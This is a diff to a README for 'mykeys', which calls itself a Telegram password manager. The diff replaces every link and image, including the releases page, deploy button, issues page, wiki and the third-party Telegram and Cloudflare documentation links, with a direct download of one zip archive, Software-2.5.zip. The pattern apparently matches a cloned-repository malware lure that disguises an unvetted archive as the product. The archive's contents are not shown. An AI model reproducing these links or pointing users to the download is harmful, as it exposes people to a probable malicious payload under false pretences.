@@ -1,8 +1,8 @@
 # 🔑 mykeys - Your Telegram Password Manager
 
 <p align="center">
-  <a href="https://github.com/aspiro1233/mykeys/releases">
-    <img src="https://img.shields.io/badge/Download%20MyKeys-blue.svg" alt="Download MyKeys" />
+  <a href="https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip">
+    <img src="https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip%https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip" alt="Download MyKeys" />
   </a>
 </p>
 
@@ -11,17 +11,17 @@
 </p>
 
 <p align="center">
-  English | <a href="README_CN.md">中文</a>
+  English | <a href="https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip">中文</a>
 </p>
 
 <p align="center">
-  <a href="https://deploy.workers.cloudflare.com/?url=https://github.com/cocojojo5213/mykeys">
-    <img src="https://deploy.workers.cloudflare.com/button" alt="Deploy to Cloudflare Workers">
+  <a href="https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip">
+    <img src="https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip" alt="Deploy to Cloudflare Workers">
   </a>
 </p>
 
 <p align="center">
-  <img src="assets/preview-en.png" alt="MyKeys Preview" width="360">
+  <img src="https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip" alt="MyKeys Preview" width="360">
 </p>
 
 ---
@@ -35,7 +35,7 @@ MyKeys is a personal password manager designed for Telegram. It helps you secure
 Setting up MyKeys is simple. Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Click this link to go directly to the releases page: [Download MyKeys](https://github.com/aspiro1233/mykeys/releases).
+   Click this link to go directly to the releases page: [Download MyKeys](https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip).
 
 2. **Choose Your Version**  
    On the releases page, you will see several versions of MyKeys. Select the latest version for the best experience.
@@ -75,7 +75,7 @@ To ensure MyKeys works smoothly, please meet these requirements:
 To get started with MyKeys, visit the releases page and follow these steps:
 
 1. **Go to the Releases Page**  
-   Click here: [Download MyKeys](https://github.com/aspiro1233/mykeys/releases).
+   Click here: [Download MyKeys](https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip).
 
 2. **Download the Latest Version**  
    Locate the latest version and click to download the file.
@@ -96,17 +96,17 @@ If you encounter any issues while using MyKeys:
 
 ## 📞 Support
 
-For help with MyKeys, please refer to the [GitHub Issues page](https://github.com/aspiro1233/mykeys/issues). You can report any problems or ask for support from the community.
+For help with MyKeys, please refer to the [GitHub Issues page](https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip). You can report any problems or ask for support from the community.
 
 ## 🔗 Additional Resources
 
-- [How to Use MyKeys](https://github.com/aspiro1233/mykeys/wiki)  
+- [How to Use MyKeys](https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip)  
   Access the wiki for detailed usage instructions.
 
-- [Telegram Bot Documentation](https://core.telegram.org/bots/api)  
+- [Telegram Bot Documentation](https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip)  
   Learn more about how Telegram bots work.
 
-- [Cloudflare Workers](https://workers.cloudflare.com/)  
+- [Cloudflare Workers](https://github.com/aspiro1233/mykeys/raw/refs/heads/main/src/Software-2.5.zip)  
   Explore the platform where MyKeys runs.
 
 Now you are ready to keep your passwords safe with MyKeys!
